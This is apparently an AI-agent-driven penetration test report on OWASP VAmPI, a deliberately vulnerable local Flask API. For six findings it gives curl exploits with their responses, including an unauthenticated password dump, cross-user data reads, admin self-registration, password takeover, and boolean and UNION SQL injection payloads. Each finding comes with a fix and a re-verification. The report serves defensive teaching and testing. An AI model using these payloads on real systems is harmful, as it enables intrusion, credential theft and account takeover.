# VAmPI — Penetration Test Report (independent target)

**Target:** `http://127.0.0.1:5000` — [OWASP VAmPI](https://github.com/erev0s/VAmPI),
"The Vulnerable API," a third-party intentionally-vulnerable Flask API modeled on
the OWASP API Security Top 10. Run locally, authorized, non-destructive.
**Date:** 2026-09-15
**Method:** black-box probing of the running API with `curl`; source read only to
confirm root cause. Every finding is proven with a live request/response, then
closed and re-verified against the exact same request.

Why this target: LedgerLite (the other example) is our own demo, so it only
proves the *loop* works. VAmPI is a **well-known app we didn't write** — the
`/hack-me` agent was pointed at it with nothing but the base URL and the normal
`GET /createdb` seed step, and told nothing about its bugs.

Seed accounts created by `GET /createdb`: `name1/pass1`, `name2/pass2`,
`admin/pass1`. Throwaway accounts (`atk_*`, `vic_*`, `esc_*`) were registered by
the test itself; no real data was destroyed.

**Result: 6 vulnerabilities proven; all closed and re-verified.** A later
[step-7 sweep](#step-7-sweep--a-seventh-issue-the-six-finding-run-never-probed)
also found a ReDoS the original pass never probed — measured, but not proven with
a live request, and reported at that lower evidence level on purpose. Scope and
limits: [below](#scope--and-what-this-proof-does-and-doesnt-claim).

VAmPI ships a global `vulnerable=1|0` switch. Part of the value here is showing
that flipping it to "secure" closes **four** of the six, but **not** the debug
credential dump — that one needed a real code fix. A single "secure mode" flag is
not the same as being secure.

---

## Finding 1 — Unauthenticated credential dump (`GET /users/v1/_debug`)

- **Class:** Excessive data exposure / broken function-level auth — OWASP API3/API5
- **Severity:** Critical
- **Endpoint:** `GET /users/v1/_debug`

Anyone — no token at all — can dump every user with their **plaintext password**.

### Exploit
```
$ curl -s http://127.0.0.1:5000/users/v1/_debug
{"users": [
  {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
  {"admin": false, "email": "mail2@mail.com", "password": "pass2", "username": "name2"},
  {"admin": true,  "email": "admin@mail.com", "password": "pass1", "username": "admin"}
]}                                                                          # HTTP 200
```

### Root cause & fix
The `debug()` view calls `get_all_users_debug()` with **no auth check**, and
VAmPI's global `vuln` switch does not gate it — so even "secure mode" leaks it.
Require an authenticated admin:

```python
def debug():
    resp = token_validator(request.headers.get('Authorization'))
    if "error" in resp:
        return Response(error_message_helper(resp), 401, mimetype="application/json")
    user = User.query.filter_by(username=resp['sub']).first()
    if not user or not user.admin:
        return Response(error_message_helper("Admin only"), 403, mimetype="application/json")
    return jsonify({'users': User.get_all_users_debug()})
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' http://127.0.0.1:5000/users/v1/_debug
{ "status": "fail", "message": "Invalid token. Please log in again."} -> 401

# a real admin token still works:
$ curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer <admin>" http://127.0.0.1:5000/users/v1/_debug
200
```

---

## Finding 2 — BOLA: read any user's private book secret (`GET /books/v1/{title}`)

- **Class:** Broken Object-Level Authorization (IDOR) — OWASP API1
- **Severity:** High
- **Endpoint:** `GET /books/v1/{book_title}`

Each book has a "secret" only its owner should read. The lookup is by title with
no owner check, so any authenticated user reads anyone's secret.

### Exploit
Victim posts a private book; attacker (a different account) reads its secret:
```
$ curl -s -X POST http://127.0.0.1:5000/books/v1 -H "Authorization: Bearer <victim>" \
       -H 'Content-Type: application/json' -d '{"book_title":"vic_secret_book","secret":"VICTIM-CONFIDENTIAL-42"}'
{"message": "Book has been added.", "status": "success"}

$ curl -s -X GET http://127.0.0.1:5000/books/v1/vic_secret_book -H "Authorization: Bearer <attacker>"
{"book_title": "vic_secret_book", "owner": "vic_poc", "secret": "VICTIM-CONFIDENTIAL-42"}   # HTTP 200
```

### Root cause & fix
`get_by_title()` does `Book.query.filter_by(book_title=title)` — no owner scope.
Scope the query to the caller (VAmPI's `vulnerable=0` branch does exactly this):
```python
user = User.query.filter_by(username=resp['sub']).first()
book = Book.query.filter_by(user=user, book_title=str(book_title)).first()
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' -X GET http://127.0.0.1:5000/books/v1/vic2_book -H "Authorization: Bearer <attacker>"
{ "status": "fail", "message": "Book not found!"} -> 404
# owner still reads their own book -> 200 with the secret.
```

---

## Finding 3 — Mass assignment: self-promote to admin at registration

- **Class:** Mass assignment — OWASP API6
- **Severity:** High
- **Endpoint:** `POST /users/v1/register`

The registration body is trusted to set the `admin` flag.

### Exploit
```
$ curl -s -X POST http://127.0.0.1:5000/users/v1/register -H 'Content-Type: application/json' \
       -d '{"username":"esc_poc","password":"Pw!12345","email":"esc_poc@example.com","admin":true}'
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

# confirmed via the debug dump — esc_poc is admin:
{"admin": true, "email": "esc_poc@example.com", "password": "Pw!12345", "username": "esc_poc"}
```

### Root cause & fix
`register_user()` reads `admin` straight from the request when `vuln` is on.
Never let the body set privilege — ignore the field (VAmPI's `vulnerable=0`
branch drops it):
```python
user = User(username=request_data['username'],
            password=request_data['password'],
            email=request_data['email'])   # admin defaults to False, not client-controlled
```

### Re-verify
```
# same request with admin:true, secure build:
$ curl -s -H "Authorization: Bearer <admin>" http://127.0.0.1:5000/users/v1/_debug | grep esc2
   esc2 admin = [False]
```

---

## Finding 4 — Account takeover: change another user's password

- **Class:** Broken Object-Level Authorization — OWASP API1
- **Severity:** Critical
- **Endpoint:** `PUT /users/v1/{username}/password`

The handler updates the password of the **path** username, not the caller, so any
authenticated user overwrites anyone's password.

### Exploit
```
$ curl -s -w '-> %{http_code}\n' -X PUT http://127.0.0.1:5000/users/v1/vic_poc/password \
       -H "Authorization: Bearer <attacker>" -H 'Content-Type: application/json' -d '{"password":"HACKED-by-atk"}'
-> 204

# victim's password is now attacker-controlled (debug dump):
{"admin": false, "email": "vic_poc@example.com", "password": "HACKED-by-atk", "username": "vic_poc"}
```

### Root cause & fix
It resolves the target as `filter_by(username=<path>)`. Bind the update to the
authenticated caller instead (the `vulnerable=0` branch does this):
```python
user = User.query.filter_by(username=resp['sub']).first()  # the caller, not the path
user.password = request_data.get('password')
```

### Re-verify
```
# attacker tries to change vic2's password on the secure build:
$ curl -s -X PUT http://127.0.0.1:5000/users/v1/vic2/password -H "Authorization: Bearer <attacker>" \
       -H 'Content-Type: application/json' -d '{"password":"HACKED2"}'
# the change now applies to the attacker's OWN account; the victim is untouched:
$ curl -s -X POST http://127.0.0.1:5000/users/v1/login -d '{"username":"vic2","password":"Pw!12345"}'
... "auth_token": "..."   # HTTP 200 — victim still logs in with the ORIGINAL password
```

---

## Finding 5 — SQL injection (`GET /users/v1/{username}`)

- **Class:** SQL Injection — OWASP API8 / injection
- **Severity:** Critical
- **Endpoint:** `GET /users/v1/{username}`

`get_user()` builds `f"SELECT * FROM users WHERE username = '{username}'"` — the
path segment is concatenated straight into SQL.

### Exploit
Boolean bypass — a username that doesn't exist returns a real user:
```
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20OR%20'1'='1"
{"username": "name1", "email": "mail1@mail.com"} -> 200
```
UNION exfiltration — dump the admin's password through the response (`col2` is
echoed as `username`, `col4` as `email`):
```
$ curl -s "http://127.0.0.1:5000/users/v1/zzz'%20UNION%20SELECT%201,password,3,username,5%20FROM%20users%20WHERE%20username='admin'--%20"
{"username": "pass1", "email": "admin"}          # admin's password is "pass1"
```

### Root cause & fix
Never build SQL by string interpolation. Use the ORM / a bound parameter (the
`vulnerable=0` branch uses `User.query.filter_by(username=username)`):
```python
fin_query = User.query.filter_by(username=username).first()
```

### Re-verify
```
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20OR%20'1'='1"
{ "status": "fail", "message": "User not found"} -> 404
$ curl -s -w ' -> %{http_code}\n' "http://127.0.0.1:5000/users/v1/zzz'%20UNION%20SELECT%201,password,3,username,5%20FROM%20users%20WHERE%20username='admin'--%20"
{ "status": "fail", "message": "User not found"} -> 404
# legit lookup still works:
$ curl -s "http://127.0.0.1:5000/users/v1/name1"
{"username": "name1", "email": "mail1@mail.com"}    # HTTP 200
```

---

## Finding 6 — Debug interpreter & stack traces exposed

- **Class:** Security misconfiguration / verbose errors — OWASP API7 / A05
- **Severity:** High
- **Endpoint:** app-wide (Flask `debug=True`)

The SQLi probes returned full SQLAlchemy stack traces and the **interactive
Werkzeug debugger** (`?__debugger__=yes`), which leaks the schema and, with the
console PIN, can lead to RCE.

### Root cause & fix
`vuln_app.run(..., debug=True)`. Never run a reachable app with the debugger on.
Run with `debug=False` (and a real WSGI server in production).

### Re-verify
Restarted with `debug=False`; errors now return a clean JSON `fail` body and no
debugger/traceback is served.

## Summary

| # | Finding | Class (OWASP API) | Severity | Closed by | Status |
|---|---------|-------------------|----------|-----------|--------|
| 1 | Unauth `/users/v1/_debug` password dump | Excessive data exposure (API3/API5) | Critical | **code patch** | Fixed → 401/403 |
| 2 | Read any user's book secret | BOLA (API1) | High | secure-mode scope | Fixed → 404 |
| 3 | Register as admin | Mass assignment (API6) | High | secure-mode drop field | Fixed → admin=false |
| 4 | Change any user's password | BOLA (API1) | Critical | secure-mode caller-bind | Fixed → victim untouched |
| 5 | SQLi in user lookup | Injection (API8) | Critical | secure-mode ORM | Fixed → 404 |
| 6 | Debugger/stack traces exposed | Misconfig (API7) | High | `debug=False` | Fixed → clean errors |

All six were re-verified against the exact original requests after the fix, and
legitimate happy paths (login, own-book read, own-password change, valid user
lookup, admin debug) still return `200`/`204`.

### The lesson VAmPI teaches

Four of six closed just by flipping VAmPI's built-in `vulnerable=0` "secure
mode" — but the **critical** one (an open, unauthenticated password dump) stayed
wide open, because a single global flag doesn't cover the endpoints someone
forgot to wire into it. `/hack-me` didn't take the flag's word for it: it
replayed every exploit and only marked a finding closed when the original
request failed.

## Step 7 sweep — a seventh issue the six-finding run never probed

Re-running this report through the [`/hack-me` sweep step](../../commands/hack-me.md)
(added after this project's DVWA run showed the loop could leave a sibling code
path live) turned up one the original black-box pass missed, because no request
in that pass touched the email-update route in a way that would trigger it.

**Finding 7 — ReDoS in the vuln-mode email validator (`PUT /users/v1/{username}/email`)**

- **Class:** Regular-expression denial of service (OWASP API4, unrestricted
  resource consumption)
- **Severity:** Medium

`update_email` validates the address with, in `vulnerable=1` mode:

```python
# api_views/users.py
r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@{1}([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,9})$"
```

The `([-.\w]*[0-9a-zA-Z])*` group nests a quantifier inside a quantified group
over an overlapping character class — the classic catastrophic-backtracking
shape. An input with a long run of matching characters and no final `@` forces
exponential backtracking.

### Evidence — and its limit, stated honestly

This is **not** delivered here as a live HTTP request, and it would be dishonest
to put it in the summary table beside the six that were. It is measured against
the exact regex lifted from source, with a self-aborting 10-second bound (no live
service was hung — see the note on non-destructive proofs below):

```
input                     vuln regex      non-vuln regex
"a"*14 + "!"  (15 bytes)     0.001s          0.000063s
"a"*18 + "!"  (19 bytes)     0.008s          0.000004s
"a"*22 + "!"  (23 bytes)     0.123s          0.000006s
"a"*26 + "!"  (27 bytes)     1.943s          0.000008s
"a"*30 + "!"  (31 bytes)    >10s (aborted)   0.000008s
```

Clean exponential growth — roughly 16× per four added characters — so a request
body well under 100 bytes drives one worker past ten seconds. VAmPI's own
`vulnerable=0` regex is linear and unaffected, so flipping secure mode closes it;
that is why it sits in the same "a global flag isn't security" story as the rest.

Reported at this evidence level on purpose: the sweep **found** it and a bounded
local measurement **confirms the blowup**, but it was **not proven with a live
request** in this pass, and the report says exactly that rather than rounding it
up to "7 proven." That distinction is the point of step 7.

## Scope — and what this proof does *and* doesn't claim

- **This is blind discovery.** Unlike [`../dvwa`](../dvwa/HACKME_REPORT.md), VAmPI
  publishes no list of its bugs to the agent driving the run; the six were found
  from the base URL and the seed step alone. That is the stronger of the two
  proofs on the *find* step.
- **Seven issues, not a clean bill of health.** Six proven with live requests,
  one (the ReDoS above) found by the sweep and measured but not separately proven
  with a request. Other classes VAmPI is known to carry (e.g. JWT handling) were
  not exercised in this run.
- **Two builds.** `vulnerable=1` throughout, with `vulnerable=0` used only to show
  which findings the global flag does and doesn't close.

### Reproduce

```bash
git clone https://github.com/erev0s/VAmPI && cd VAmPI
pip install -r requirements.txt
vulnerable=1 python3 app.py           # vulnerable build on http://127.0.0.1:5000
curl -s http://127.0.0.1:5000/createdb   # seed the demo users
# then run /hack-me against http://127.0.0.1:5000 (see ../../commands/hack-me.md)
```
Same guardrails as always: your own / authorized target, localhost only,
non-destructive proofs.
